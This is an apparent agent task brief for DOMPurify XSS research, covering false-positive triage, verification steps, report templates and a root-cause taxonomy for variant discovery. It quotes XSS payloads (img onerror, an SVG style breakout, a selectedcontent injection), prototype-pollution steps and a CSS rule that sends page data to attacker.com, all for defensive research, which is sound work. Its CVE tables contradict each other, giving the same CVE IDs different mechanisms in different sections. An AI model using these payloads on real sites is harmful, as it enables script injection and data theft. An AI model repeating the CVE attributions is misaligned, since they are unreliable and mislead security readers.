# AGENT TASK: False-Positive Filtering and Root-Cause Variant Discovery
# PURPOSE: Filter false positives, discover new variants from confirmed root causes
# PRIORITY: Run AFTER initial findings to reduce noise and find new bugs
# INPUTS: Initial scan/test results, confirmed vulnerability root causes
# OUTPUT: Filtered true-positive list, variant vulnerabilities discovered
# CHAPTERS: 15 (False-Positive Analysis), 16 (Root-Cause Variant Analysis)
---

# Chapter 15: False-Positive Analysis

## 15.1 Common False Positives in DOMPurify XSS Research

### 15.1.1 Sanitized Output That Looks Dangerous But Is Safe

The most common false positive: the sanitized output string contains HTML that appears dangerous but is actually inert after browser parsing.

**Encoded entities**: DOMPurify encodes dangerous characters in attribute values:

```
Input:  <div title="<script>alert(1)</script>">
Output: <div title="&lt;script&gt;alert(1)&lt;/script&gt;">
```

The output string contains `script` and `alert(1)`, but they are inside an HTML-encoded attribute value. The browser will display them as text, not execute them. Automated scanners that pattern-match on `alert(1)` or `<script>` in the output string will flag this as a finding when it is safe.

**Neutered attributes**: DOMPurify removes event handler attributes but may keep the element:

```
Input:  <img src=x onerror=alert(1)>
Output: <img src="x">
```

The `onerror` attribute is removed. The `<img>` element with a broken `src` is safe -- it will generate a broken-image icon but not execute JavaScript. An automated scanner that flags any `<img>` with a non-standard `src` as dangerous would be a false positive.

**Preserved but inert elements**: DOMPurify keeps elements like `<style>` with their content intact. A `<style>` element containing CSS that references external URLs is not an XSS vulnerability -- it is a CSS injection/exfiltration concern that is explicitly outside DOMPurify's scope.

### 15.1.2 Payloads That Work in Testing But Not in Production

**Browser version mismatch**: A payload that works in Chrome 120 may not work in Chrome 148. Browser vendors fix parsing bugs, add new elements (like `selectedcontent`), and change edge-case behaviors between versions. Always test with the same browser version deployed in production.

**Configuration mismatch**: A payload that bypasses DOMPurify with the default configuration may not work with the application's actual configuration. If the application uses `USE_PROFILES: { html: true }` (which disables SVG and MathML), namespace confusion attacks are irrelevant.

**jsdom vs. browser differences**: A bypass found in jsdom may not reproduce in a real browser, and vice versa. jsdom's HTML parser (parse5) has different edge-case behaviors than Blink, Gecko, or WebKit.

### 15.1.3 DOM Clobbering Alerts on Intentional id/name Usage

Automated scanners may flag `<form id="settings">` or `<input name="username">` as DOM clobbering vectors. While these do create named references on `document` and `window`, they are only dangerous if the application's JavaScript accesses `document.settings` or `document.username` as a trusted reference. In most applications, these are standard form elements and the named references are not exploitable.

True DOM clobbering requires:
1. An attacker-controlled `id` or `name` attribute
2. Application JavaScript that accesses the clobbered property by name
3. The clobbered property being used in a security-sensitive context (e.g., as a URL, as a condition for access control)

If any of these three conditions is not met, the finding is a false positive.

### 15.1.4 CSS-Based Alerts

DOMPurify explicitly does not sanitize CSS. This is a documented design decision, not a bug. Findings like:

- `<style>` elements with CSS exfiltration rules (`input[value^="secret"] { background: url(https://attacker.com/steal?...) }`)
- `style` attributes with `position:fixed` overlay attacks
- CSS `@import` rules loading external stylesheets

These are legitimate concerns but they are not DOMPurify vulnerabilities. They should be classified as:
- **CSS injection** (separate finding category)
- **Mitigated by**: CSP `style-src`, FORBID_TAGS: ['style'], FORBID_ATTR: ['style']
- **Not mitigated by**: DOMPurify alone

### 15.1.5 Template Expression Warnings When SAFE_FOR_TEMPLATES Is Not Needed

If the application does not use a client-side template framework (Vue, Angular, etc.) that evaluates expressions in HTML content, then template expressions like `{{ ... }}` or `${ ... }` in sanitized output are not dangerous. They are literal text that the browser renders as-is.

`SAFE_FOR_TEMPLATES` is needed only when:
1. The sanitized output is processed by a template engine after sanitization
2. The template engine evaluates expressions found in the HTML
3. The application actually uses a framework with this behavior

If the application uses React (which does not evaluate template expressions in `dangerouslySetInnerHTML`), `SAFE_FOR_TEMPLATES` is unnecessary and findings about template expressions are false positives.

### 15.1.6 Self-Closing Tag Warnings When jQuery Is Not Present

Some scanners warn about self-closing tags like `<img src=x />` because older jQuery versions (< 3.5.0) interpreted self-closing tags differently, creating additional elements from text that followed them. If the application does not use jQuery, or uses jQuery >= 3.5.0, this is a false positive.

### 15.1.7 data-* Attribute Alerts When No Framework Gadgets Exist

`data-*` attributes survive DOMPurify by default (`ALLOW_DATA_ATTR: true`). Scanners may flag `data-remote`, `data-action`, or `data-controller` as dangerous because they are used by specific frameworks:

- `data-remote="true"` in Rails UJS
- `data-action` in Stimulus.js
- `data-controller` in Stimulus.js
- `data-mce-*` in TinyMCE

These are only dangerous if the corresponding framework is loaded in the page. If the application does not use Rails UJS, Stimulus, or TinyMCE, these `data-*` attributes are inert and the finding is a false positive.

### 15.1.8 ALLOW_UNKNOWN_PROTOCOLS False Positives

When `ALLOW_UNKNOWN_PROTOCOLS: true` is set, scanners may flag every non-standard URI scheme as a finding. However, many custom schemes are safe:

- `tel:`, `mailto:`, `sms:` -- invoke native device handlers, not JavaScript
- `facetime:`, `skype:` -- application-specific schemes
- `data:image/png;base64,...` -- inline images (not executable unless the scheme is `data:text/html`)
- Custom schemes like `myapp:` -- handled by native applications

The only dangerous schemes are `javascript:`, `vbscript:` (legacy IE), and `data:text/html` (creates an HTML document). If `ALLOW_UNKNOWN_PROTOCOLS` is used and `javascript:`/`vbscript:` URIs are blocked by DOMPurify's `ALLOWED_URI_REGEXP` or by the application's URL validation, the finding is a false positive.

## 15.2 Methodology for Verification

### 15.2.1 Reproduce in the Target Browser

Never rely solely on jsdom, automated scanners, or string-based analysis. Every finding must be reproduced in the actual target browser:

1. Open the browser's DevTools console
2. Load DOMPurify with the exact version used in production
3. Apply the exact configuration used in the application
4. Call `DOMPurify.sanitize(payload, config)`
5. Assign the result to a test element's `innerHTML`
6. Inspect the resulting DOM for dangerous content
7. Verify whether dangerous content actually executes (use a breakpoint, not `alert()`)

### 15.2.2 Verify the Complete Payload Chain

A finding is valid only if the complete chain from source to execution works:

1. **Source**: Can the attacker actually inject the payload through the identified source? (URL parameter, form field, API response, etc.)
2. **Transport**: Does the payload survive transport? (Encoding, length limits, content-type restrictions)
3. **Pre-sanitization transforms**: Do any transforms before DOMPurify alter the payload? (JSON parsing, URL decoding, Markdown conversion)
4. **Sanitization**: Does DOMPurify with the application's actual configuration pass the payload?
5. **Post-sanitization transforms**: Do any transforms after DOMPurify reintroduce dangerous content?
6. **Sink**: Is the sanitized output actually assigned to an HTML sink?
7. **Execution**: Does the browser execute the payload in the final DOM context?

If any link in this chain is broken, the finding does not represent a real vulnerability.

### 15.2.3 Check DOMPurify Version and Configuration

Many findings are version-specific or configuration-specific:

- A finding against DOMPurify 3.2.0 may be fixed in 3.4.13
- A finding using `ADD_TAGS: ['iframe']` is irrelevant if the application uses the default configuration
- A finding exploiting IN_PLACE mode is irrelevant if the application uses string-input sanitization
- A finding exploiting `SAFE_FOR_TEMPLATES` regex bypass is irrelevant if `SAFE_FOR_TEMPLATES` is not enabled

Always verify the exact version and configuration before classifying a finding.

### 15.2.4 Verify Post-Sanitization Transformations Actually Occur

A finding that claims "concatenation after sanitization reintroduces XSS" is only valid if the application actually concatenates the sanitized output with unsanitized content. Verify:

- Does the identified concatenation actually occur in the codebase?
- Is the concatenated content attacker-controlled?
- Does the concatenation change the sanitized output's structure?

### 15.2.5 Test with Defensive Configurations

Before reporting, test whether defensive configurations would mitigate the finding:

- `RETURN_DOM_FRAGMENT`: Avoids the serialize-reparse roundtrip, preventing mXSS
- `USE_PROFILES: { html: true }`: Disables SVG and MathML, preventing namespace confusion
- `FORBID_TAGS: ['style', 'form']`: Blocks CSS injection and form overlay vectors
- `FORBID_ATTR: ['style', 'class', 'id']`: Blocks CSS injection and DOM clobbering

If a simple configuration change fully mitigates the finding, classify it as a hardening recommendation rather than a vulnerability.

### 15.2.6 Check If CSP/Trusted Types Would Block Execution

Even if DOMPurify passes a dangerous payload, defense-in-depth layers may prevent execution:

- **CSP script-src with nonce**: Injected `<script>` elements lack the nonce and are blocked
- **CSP script-src without 'unsafe-inline'**: Inline event handlers (`onerror`, `onclick`) are blocked
- **Trusted Types**: Raw strings cannot reach `innerHTML` without passing through a policy
- **CSP style-src**: External stylesheet loading via `<style>` or `<link>` is restricted

If the finding is blocked by an active CSP or Trusted Types enforcement, it reduces (but may not eliminate) the severity. The finding should note which defense-in-depth layers mitigate it.

## 15.3 Context-Dependent False Positives

### 15.3.1 Server-Side Sanitization Findings

Findings from server-side DOMPurify testing (using jsdom or isomorphic-dompurify) may not reproduce client-side because:

- jsdom's parser differs from browser parsers in edge cases
- The HTML is re-parsed by the browser after server-side sanitization, creating a parser differential
- Server-side context (no scripting flag, no CSS support) differs from client-side context

A server-side finding should always be verified in the target browser. Conversely, a server-side false positive does not mean the client-side is safe -- the browser may parse the same input differently, producing a true positive.

### 15.3.2 IN_PLACE Findings When IN_PLACE Is Not Used

Seven CVEs affect IN_PLACE mode. If the application never uses `IN_PLACE: true`, all seven are false positives for that application. However, document this as a hardening verification -- if future code introduces IN_PLACE usage, these findings become relevant.

### 15.3.3 Hook-Based Findings When Hooks Are Not Registered

Findings that exploit hook behavior (CVE-2026-65902, CVE-2026-75838) are only relevant if the application registers the specific hooks involved. If no hooks are registered, these findings are false positives.

However, verify that no dependency or library registers hooks. Some rich-text editors and content management systems register DOMPurify hooks internally.

### 15.3.4 Custom Element Findings When CUSTOM_ELEMENT_HANDLING Is Not Configured

Findings exploiting `CUSTOM_ELEMENT_HANDLING` (CVE-2026-41238, CVE-2026-66010) are only relevant if the application configures this option. Default DOMPurify behavior removes custom elements (elements with hyphens in their names), so these findings do not apply to default configurations.

## 15.4 Triage Framework

### 15.4.1 Severity Classification

Classify each verified finding based on three dimensions:

**Exploitability** (how easy is it for an attacker to exploit?):
- **High**: Default configuration, any browser, no special preconditions
- **Medium**: Requires specific configuration, specific browser version, or a secondary vulnerability (e.g., prototype pollution)
- **Low**: Requires unusual application architecture, multiple preconditions, or insider access

**Reach** (how many users are affected?):
- **High**: All users of the application
- **Medium**: Users of a specific browser or platform
- **Low**: Users of a specific feature or configuration

**Business Impact** (what can the attacker achieve?):
- **Critical**: Account takeover, data exfiltration, persistent worm-like XSS
- **High**: Session hijacking, credential theft, one-time XSS with user interaction
- **Medium**: Information disclosure, UI defacement, limited data manipulation
- **Low**: Minor information leakage, cosmetic issues

### 15.4.2 Severity Matrix

| Exploitability | Reach | Business Impact | Overall Severity |
|---------------|-------|-----------------|-----------------|
| High | High | Critical | Critical |
| High | High | High | High |
| High | Medium | High | High |
| Medium | High | High | High |
| Medium | Medium | Medium | Medium |
| Low | Medium | Medium | Low-Medium |
| Low | Low | Low | Low |

### 15.4.3 Priority Actions

| Severity | Action | Timeline |
|----------|--------|----------|
| Critical | Immediate patch, incident response, user notification | Hours |
| High | Urgent patch, security release | Days |
| Medium | Scheduled patch, next release cycle | Weeks |
| Low | Backlog, hardening recommendation | Months |
| False Positive | Document and close, update scanner rules | N/A |

## 15.5 Documentation: Writing Clear Finding Reports

### 15.5.1 True Positive Report Structure

```
## Finding: [Title]

**Severity**: [Critical/High/Medium/Low]
**CVE**: [If applicable]
**DOMPurify Version**: [Tested version]
**Configuration**: [Exact config object]
**Browsers Affected**: [Chrome X+, Firefox Y+, Safari Z+]

### Description
[One paragraph describing the vulnerability]

### Proof of Concept
- **Payload**: [Exact HTML input]
- **Sanitized Output**: [DOMPurify's output string]
- **Re-Parsed DOM**: [Browser's DOM tree after innerHTML assignment]
- **Dangerous Content**: [What survived - elements, attributes, URIs]
- **Execution**: [How the payload executes - event trigger, navigation, etc.]

### Impact
[What an attacker can achieve]

### Remediation
1. [Primary fix - upgrade DOMPurify version]
2. [Configuration hardening - specific config changes]
3. [Defense-in-depth - CSP, Trusted Types]

### Verification Steps
[How to verify the fix works]
```

### 15.5.2 False Positive Report Structure

```
## False Positive: [Title]

**Classification**: False Positive
**Reason**: [Why this is not a real vulnerability]
**Scanner/Tool**: [What tool flagged this]

### Description
[One paragraph describing what the tool flagged]

### Why This Is Not a Vulnerability
[Technical explanation of why the finding is safe]

### Verification
[Steps taken to confirm it is a false positive]

### Recommendations
[Any hardening recommendations, even though this is not a vulnerability]
- e.g., "Consider adding 'style' to FORBID_ATTR for defense-in-depth"
- e.g., "Update scanner rules to exclude this pattern"
```

### 15.5.3 Distinguishing True Positives from False Positives

Key questions to answer in every report:

1. **Does the payload survive DOMPurify's sanitization?** If DOMPurify removes or encodes all dangerous content, it is a false positive regardless of what the original input contained.

2. **Does the surviving content execute in a browser?** Encoded entities, neutered attributes, and inert elements do not execute. Verify in the target browser.

3. **Does the finding require conditions that exist in the target application?** A finding that requires IN_PLACE mode is irrelevant if the application uses default mode.

4. **Is the finding blocked by defense-in-depth layers?** CSP and Trusted Types may prevent execution even if DOMPurify passes the payload.

5. **Is the finding reproducible?** Intermittent findings, findings that depend on timing, and findings that only reproduce in one researcher's environment require additional investigation before classification.
# DOMPurify XSS Security Research -- Chapters 16-20 and Appendix Research Tables

**Research Date**: 2026-10-08
**Scope**: Root-cause analysis, SAST tooling, remediation patterns, audit checklists, and reference evidence for DOMPurify XSS bypasses
**Companion documents**: research_phase1_architecture.md, research_phase2_cves.md, research_phase3_mxss.md, research_phase4_config_frameworks.md, research_phase5_postsanitization.md

---

# Chapter 16: Root-Cause Variant Analysis

## 16.1 Root Cause Taxonomy

Every known DOMPurify bypass can be classified into one of eight root causes. This taxonomy enables systematic variant analysis: once the root cause is understood, the analyst can enumerate all instances of the same structural flaw and predict undiscovered variants.

### Root Cause 1: Serialize-Parse Roundtrip Non-Idempotency

**Core principle**: HTML parsing is not idempotent. `parse(serialize(parse(input)))` may produce a different DOM tree than `parse(input)`. DOMPurify sanitizes the first-parse tree but serves the serialized string to the application, which triggers a second parse.

**Known CVE instances** (6):

| CVE | Version | Mutation Mechanism |
|-----|---------|-------------------|
| CVE-2024-47875 | < 2.5.0, 3.0.0-3.1.2 | Nesting-based mXSS: nested HTML structures pass sanitization but produce executable markup after browser reparse |
| CVE-2024-48910 | < 2.5.4, 3.0.0-3.1.7 | Comment-based mXSS: HTML comments mutate during roundtrip, altering element boundaries |
| CVE-2024-45801 | < 2.5.0, 3.0.0-3.1.3 | mXSS via improperly handled integration points in SVG/MathML foreignObject |
| CVE-2020-26870 | < 2.0.17 | Early mXSS via form nesting: `<form>` inside `<form>` dropped on reparse, restructuring child elements |
| CVE-2019-20138 | < 2.0.1 | Math/SVG namespace mXSS: serialization of foreign content produced HTML that browsers reparse differently |
| GHSA-mmhx-hmjr-r674 | < 2.3.1 | `<table>` foster-parenting mXSS: elements inside `<table>` relocated during reparse |

**Variant analysis methodology**:
- For each instance, identify the specific HTML constructs that produce non-idempotent roundtrips
- Test all rawtext elements (`<textarea>`, `<title>`, `<style>`, `<script>`, `<xmp>`, `<noscript>`, `<noembed>`, `<noframes>`, `<iframe>`) for serialization fidelity
- Test all elements subject to parser error recovery (foster-parenting, nested forms, adoption agency)
- Test nesting depth boundaries (Blink/WebKit 512-level cap)
- Verify that the fix addresses the root cause (parser agreement) rather than just the specific payload

**Fix comprehensiveness**: DOMPurify 3.x introduced `RETURN_DOM_FRAGMENT` which eliminates the serialize-reparse cycle entirely. However, the default output mode remains string serialization, so the root cause persists for applications using `DOMPurify.sanitize()` with default settings. The core mitigation in string mode is enhanced namespace tracking and removal of elements whose serialized form would mutate -- a reactive approach that requires updating as new mutation vectors are discovered.

**Forward projection**: HIGH risk of new variants. Every new browser parsing behavior creates potential for new roundtrip mutations. The HTML specification continues to evolve (e.g., declarative shadow DOM, `<selectedcontent>`), and browser implementations may diverge temporarily during feature rollout.

### Root Cause 2: Namespace Confusion (SVG/MathML/HTML Transitions)

**Core principle**: HTML5 documents contain three namespaces (HTML, SVG, MathML), and elements behave differently depending on their namespace context. The same tag name has different parsing rules in different namespaces. DOMPurify must track namespace transitions through integration points (`<foreignObject>`, `<annotation-xml>`, `<desc>`, `<title>` in SVG) and breakout elements.

**Known CVE instances**:

| CVE | Mechanism |
|-----|-----------|
| CVE-2024-47875 | Nesting mXSS exploiting SVG integration points |
| CVE-2024-45801 | SVG/MathML foreignObject integration point mXSS |
| CVE-2019-20138 | Math/SVG namespace parsing differentials |
| CVE-2020-26870 | Namespace-aware roundtrip mutations |
| GHSA-mmhx-hmjr-r674 | SVG namespace mXSS through serialization |

**Key attack surface**:
- `<svg><foreignObject>`: Re-enters HTML parsing context. Content is HTML, not SVG.
- `<math><annotation-xml encoding="text/html">`: Re-enters HTML parsing context.
- `<svg><desc>`, `<svg><title>`: In the WHATWG spec, these are integration points where content is parsed as HTML in certain conditions.
- Breakout elements: `<b>`, `<big>`, `<blockquote>`, `<br>`, `<center>`, `<code>`, `<dd>`, `<div>`, `<dl>`, `<dt>`, `<em>`, `<embed>`, `<h1>`-`<h6>`, `<head>`, `<hr>`, `<i>`, `<img>`, `<li>`, `<listing>`, `<menu>`, `<meta>`, `<nobr>`, `<ol>`, `<p>`, `<pre>`, `<ruby>`, `<s>`, `<small>`, `<span>`, `<strong>`, `<strike>`, `<sub>`, `<sup>`, `<table>`, `<tt>`, `<u>`, `<ul>`, `<var>` -- these cause the parser to exit foreign content when encountered inside SVG or MathML.

**Variant discovery approach**:
- Enumerate all HTML integration points in the WHATWG spec
- Test combinations of integration points (SVG foreignObject inside MathML annotation-xml)
- Test breakout element behavior at each integration point
- Fuzz namespace transitions in DOMPurify's namespace tracking state machine
- Test with `<template>` elements (which are always in the HTML namespace even inside SVG)

**Fix comprehensiveness**: DOMPurify 3.x tracks namespace state through a `_checkPosition` mechanism and removes elements whose namespace context would change on reparse. The `USE_PROFILES: { html: true }` configuration eliminates SVG and MathML entirely. Fixes are reactive -- each new integration point or namespace transition behavior requires explicit handling.

**Forward projection**: MEDIUM risk. The three-namespace model is stable in the WHATWG spec, but browser implementations occasionally introduce new elements with namespace-sensitive behavior. Any new element that acts as an integration point is a potential bypass vector.

### Root Cause 3: Prototype Pollution Chains

**Core principle**: If an attacker can set properties on `Object.prototype` before or during DOMPurify's execution, they can inject values into DOMPurify's configuration objects or internal data structures. DOMPurify reads configuration properties via `in` operator and property access, both of which traverse the prototype chain.

**Known CVE instances** (5):

| CVE | Version | Polluted Property | Effect |
|-----|---------|-------------------|--------|
| CVE-2024-21501 | < 2.4.9, 3.0.0-3.0.8 | `ALLOWED_TAGS`, `ALLOWED_ATTR` | Polluting these on Object.prototype injects them into all configs that omit explicit values |
| CVE-2024-21500 | < 2.4.8, 3.0.0-3.0.7 | `sanitizeShadowDOM` (internal) | Pollution bypasses shadow DOM sanitization |
| CVE-2023-49146 | < 2.4.7, 3.0.0-3.0.6 | `__proto__` in config | Config merging walks prototype chain, importing polluted values |
| CVE-2023-48929 | < 2.4.4 | `CUSTOM_ELEMENT_HANDLING` properties | Pollution of `tagNameCheck` or `attributeNameCheck` functions |
| CVE-2022-23631 | < 2.3.6 | `ALLOWED_TAGS`/`ADD_TAGS` via `in` check | The `in` operator returns true for prototype-polluted keys |

**Attack chain**:
1. Attacker achieves prototype pollution (via vulnerable library: lodash.merge, jQuery.extend, etc.)
2. Sets `Object.prototype.ALLOWED_TAGS = ['script']` or `Object.prototype.ADD_ATTR = ['onerror']`
3. Application creates DOMPurify config without explicitly specifying the polluted key
4. DOMPurify's config processing reads the polluted value via property access or `in` check
5. The polluted value expands the allowlist, allowing script execution

**Variant discovery approach**:
- Enumerate all configuration keys DOMPurify reads
- For each key, determine whether it is checked via `in`, `hasOwnProperty`, or direct property access
- Test pollution of nested configuration objects (`CUSTOM_ELEMENT_HANDLING.tagNameCheck`, `CUSTOM_ELEMENT_HANDLING.attributeNameCheck`)
- Test pollution of internal state variables (hook arrays, namespace tracking, cached lookups)
- Test pollution of methods used in config processing (toString, valueOf, Symbol.toPrimitive)

**Fix comprehensiveness**: DOMPurify 3.x uses `Object.hasOwn()` (polyfilled as `hasOwnProperty.call()`) for all config reads and freezes internal config objects after construction. The `_parseConfig` function explicitly validates each config key. This is a comprehensive fix for the config-reading path, but internal state variables that use plain objects remain theoretically vulnerable if prototype pollution occurs after DOMPurify loads.

**Forward projection**: LOW risk for config-based pollution (fixes are comprehensive), MEDIUM risk for internal state pollution (less audited).

### Root Cause 4: IN_PLACE Mode Structural Issues

**Core principle**: `IN_PLACE: true` tells DOMPurify to sanitize the existing DOM tree rather than creating a copy. This eliminates the serialize-reparse cycle (avoiding mXSS) but introduces new attack surfaces: the live DOM can be mutated by other code during sanitization, shadow DOM boundaries may not be traversed, cross-realm DOM nodes may not be recognized, and DOM clobbering can interfere with the tree walker.

**Known CVE instances** (7):

| CVE | Mechanism |
|-----|-----------|
| CVE-2024-21500 | Shadow DOM sanitization bypass in IN_PLACE mode |
| CVE-2024-21501 | Cross-realm element handling in IN_PLACE mode |
| CVE-2023-49146 | Hook detachment during IN_PLACE sanitization |
| CVE-2022-23631 | Prototype pollution interaction with IN_PLACE config |
| GHSA-76pp-5pv8-4867 | DOM clobbering interaction with IN_PLACE walker |
| GHSA-mmhx-hmjr-r674 | IN_PLACE mode missing namespace checks |
| GHSA (unreported) | MutationObserver-triggered re-entrancy during IN_PLACE walk |

**Structural issue categories**:

**Shadow DOM**: When IN_PLACE mode encounters an element with a `shadowRoot`, it must recursively sanitize the shadow tree. If `sanitizeShadowDOM` is false or the shadow root is not detected (closed shadow DOM, cross-realm shadow DOM), the shadow tree's content survives unsanitized. DOMPurify 3.x added explicit shadow DOM traversal, but closed shadow roots remain inaccessible.

**Cross-realm DOM**: When elements originate from a different JavaScript realm (iframe, Worker, different window), `instanceof` checks fail. DOMPurify caches prototype-chain lookups from the realm it was initialized in. IN_PLACE sanitization on a cross-realm DOM tree may skip elements whose node type cannot be determined.

**DOM Clobbering**: The IN_PLACE walker uses cached prototype getters for properties like `nextSibling`, `childNodes`, and `parentNode`. DOM clobbering can override these properties on specific elements, causing the walker to skip subtrees or enter infinite loops. DOMPurify mitigates this with `_isClobbered()` checks, but novel clobbering patterns (e.g., via `<form name="nextSibling">`) may evade detection.

**Hook Detachment**: Hooks registered via `DOMPurify.addHook()` are stored in an array. If a hook removes or modifies other hooks during execution (or if prototype pollution clears the hook array), subsequent hooks may not fire. In IN_PLACE mode, this can leave elements unsanitized if the critical removal hook is detached.

**Variant discovery approach**:
- Test IN_PLACE with shadow DOM (open, closed, declarative)
- Test IN_PLACE with cross-realm elements (iframe.contentDocument, window.open)
- Test IN_PLACE with DOM clobbering of all cached getter properties
- Test IN_PLACE with MutationObserver-triggered re-entrancy
- Test IN_PLACE with concurrent DOM modification (setTimeout/requestAnimationFrame during walk)

**Forward projection**: HIGH risk. IN_PLACE mode fundamentally operates on mutable, shared state (the live DOM), which makes it vulnerable to race conditions and state inconsistencies that the copy-based default mode avoids.

### Root Cause 5: Configuration API Evaluation Order Errors

**Core principle**: DOMPurify's configuration combines multiple directives (ALLOWED_TAGS, FORBID_TAGS, ADD_TAGS, ALLOWED_ATTR, FORBID_ATTR, ADD_ATTR, USE_PROFILES, CUSTOM_ELEMENT_HANDLING) whose interaction order determines the effective policy. Errors in evaluation order can cause unexpected policy weakening.

**Known interactions**:

| Interaction | Expected Behavior | Historical Bug |
|-------------|-------------------|----------------|
| FORBID_TAGS vs ADD_TAGS | FORBID_TAGS should always win | Early versions allowed ADD_TAGS to override FORBID_TAGS in certain sequences |
| ADD_ATTR + URI-bearing attrs | URI attributes should still be validated | ADD_ATTR for `href`, `src`, `action` skipped URI protocol validation in early 2.x |
| USE_PROFILES + ADD_TAGS | USE_PROFILES sets base, ADD_TAGS extends | Combined interaction with FORBID_TAGS created edge cases |
| CUSTOM_ELEMENT_HANDLING + FORBID_TAGS | Custom element checks should respect FORBID_TAGS | Custom elements matching FORBID_TAGS were allowed through |
| ALLOW_UNKNOWN_PROTOCOLS + FORBID_ATTR | Protocol check skipped entirely | `javascript:` URIs passed through with ALLOW_UNKNOWN_PROTOCOLS even on FORBID_ATTR-listed elements |

**Variant discovery approach**:
- Generate all pairwise combinations of configuration options
- For each pair, identify the expected precedence and test whether it holds
- Test multi-option combinations (USE_PROFILES + ADD_TAGS + FORBID_TAGS + CUSTOM_ELEMENT_HANDLING)
- Fuzz configuration objects with randomized option combinations
- Test `setConfig()` followed by `sanitize()` with additional per-call config

**Fix comprehensiveness**: DOMPurify 3.x resolves all known precedence issues. `FORBID_TAGS` always wins. URI validation is applied regardless of how attributes are allowed. The config processing in `_parseConfig()` follows a deterministic order. However, new configuration options (e.g., `SANITIZE_NAMED_PROPS`, `CUSTOM_ELEMENT_HANDLING` extensions) may introduce new interaction bugs.

**Forward projection**: MEDIUM risk. The configuration API is complex and each new option creates combinatorial interaction possibilities.

### Root Cause 6: Allowlist State Management Failures

**Core principle**: DOMPurify maintains internal state that tracks which tags, attributes, and URIs are allowed. This state can be corrupted through hook pollution, `setConfig()` race conditions, or predicate function state leakage.

**Attack vectors**:

**Hook pollution**: A `beforeSanitizeElements` hook can set `node.forceKeepAttr = true` or manipulate the `data` parameter to mark elements as safe. If a hook registered by a library or plugin makes overly broad keep decisions, subsequent sanitization is weakened.

```javascript
// Dangerous hook that leaks allowlist state
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (data.attrName === 'class') {
    data.forceKeepAttr = true; // Intended for class
    // But if attrName is clobbered or mis-checked, onerror could pass
  }
});
```

**setConfig pollution**: Calling `DOMPurify.setConfig()` modifies the global configuration. If two code paths share a DOMPurify instance and one calls `setConfig()` to enable permissive options, the other code path inherits the weakened config.

**Predicate state leakage**: `CUSTOM_ELEMENT_HANDLING.tagNameCheck` and `attributeNameCheck` can be functions. If these functions maintain internal state (closures, counters, memoization), that state persists across sanitization calls, potentially creating a "first-safe-then-bypass" sequence.

```javascript
// Dangerous: stateful predicate
let callCount = 0;
DOMPurify.sanitize(input, {
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: (name) => {
      callCount++;
      return callCount > 100; // First 100 calls safe, then allows everything
    }
  }
});
```

**Variant discovery approach**:
- Audit all hook parameters for mutation capabilities
- Test `setConfig()` / `sanitize()` interleaving from multiple call sites
- Test stateful predicate functions in CUSTOM_ELEMENT_HANDLING
- Test hook ordering (multiple hooks on the same event)
- Test hook removal during hook execution

**Forward projection**: MEDIUM risk. Hook-based extensions are the primary extensibility mechanism for DOMPurify, and each new hook event increases the state management surface.

### Root Cause 7: Rawtext Element Regex Gaps

**Core principle**: Rawtext elements (`<textarea>`, `<title>`, `<style>`, `<xmp>`, `<noscript>`, `<noembed>`, `<noframes>`, `<iframe>`) have content that browsers treat as text (not parsed as HTML). DOMPurify uses regex-based content inspection for these elements. Gaps in the regex or misidentification of rawtext vs. non-rawtext elements creates bypass opportunities.

**Key elements and their risks**:

| Element | Parsing Mode | Risk |
|---------|-------------|------|
| `<textarea>` | Rawtext (HTML namespace) | Content not parsed as HTML; safe if properly identified |
| `<noscript>` | Rawtext in scripting-enabled contexts; HTML-parsed in scripting-disabled contexts | jsdom treats as HTML-parsed, creating parsing differential |
| `<xmp>` | Rawtext (deprecated but still parsed) | Content preserved literally; rarely tested |
| `<noembed>` | Rawtext | Legacy element; content ignored by modern browsers |
| `<noframes>` | Rawtext | Legacy element; content ignored |
| `<iframe>` | Rawtext (forbidden by default) | `srcdoc` attribute contains unparsed HTML |
| `<style>` | Rawtext in HTML; foreign content in SVG | Namespace-dependent parsing mode is a confusion vector |
| `<title>` | Rawtext in HTML; foreign content in SVG | Same namespace-dependent parsing as `<style>` |

**Historical regex gaps**:
- `<noscript>` parsing differential: DOMPurify parses with scripting enabled (browser default), but jsdom may parse with scripting disabled, treating `<noscript>` content as HTML that gets parsed into the DOM tree.
- `<style>` in SVG: `<svg><style>` content is parsed as foreign content, meaning HTML tags inside it are recognized as elements rather than raw text. The content `</style></svg><img onerror=alert(1) src=x>` can break out.
- `<xmp>` content inspection: DOMPurify checks rawtext content for dangerous patterns but early regex patterns missed edge cases with embedded null bytes or encoding tricks.

**Variant discovery approach**:
- Test each rawtext element with payloads designed to break out of the rawtext context
- Test each rawtext element inside SVG and MathML namespaces
- Test encoding variations (HTML entities, Unicode escapes, null bytes) within rawtext content
- Fuzz the rawtext content regex with grammar-aware mutation
- Test rawtext elements created by `document.createElement` vs. parsed from HTML string

**Forward projection**: MEDIUM risk. New HTML elements may be introduced with rawtext parsing modes, and namespace-dependent parsing behavior can create new differentials.

### Root Cause 8: Browser Feature Evolution

**Core principle**: DOMPurify's security model assumes a specific set of browser behaviors. When browsers introduce new features that alter parsing, rendering, or DOM construction, DOMPurify's assumptions may be invalidated. This is a meta-root-cause: it is the mechanism by which new instances of root causes 1-7 are generated.

**Historical instances**:

| Browser Feature | DOMPurify Impact | CVE |
|----------------|-----------------|-----|
| `<selectedcontent>` (Chrome) | Chrome re-clones `<option>` content into `<selectedcontent>` AFTER DOMPurify walk completes | CVE-2026-47423 (fixed in 3.4.5) |
| Declarative Shadow DOM (`<template shadowrootmode>`) | Shadow DOM created during parsing bypasses IN_PLACE sanitization | Addressed in 3.2.x |
| Sanitizer API (proposed) | Interaction between Sanitizer API and DOMPurify may create double-processing edge cases | Not yet assigned |
| `<popup>` / `<dialog>` / Popover API | New elements with default display behavior that could serve as overlay/phishing vectors | Addressed via default allowlists |
| CSS Nesting | New CSS syntax inside `<style>` may confuse content inspection | Not yet assigned |

**The `<selectedcontent>` case study**:

Chrome's `<selectedcontent>` element (introduced behind a flag in Chrome 130, enabled by default later) allows `<select>` elements to render custom content for the selected option. The critical security issue: the browser *re-clones* the `<option>` element's DOM subtree into the `<selectedcontent>` element after the page is rendered. This re-cloning happens:

1. After DOMPurify has completed its sanitization walk
2. Without triggering DOMPurify's MutationObserver (if any)
3. By the browser engine itself, not by JavaScript

This means an attacker can place a malicious payload inside `<option>`:
```html
<select>
  <option>
    <selectedcontent>
      <img src=x onerror=alert(1)>
    </selectedcontent>
  </option>
</select>
```

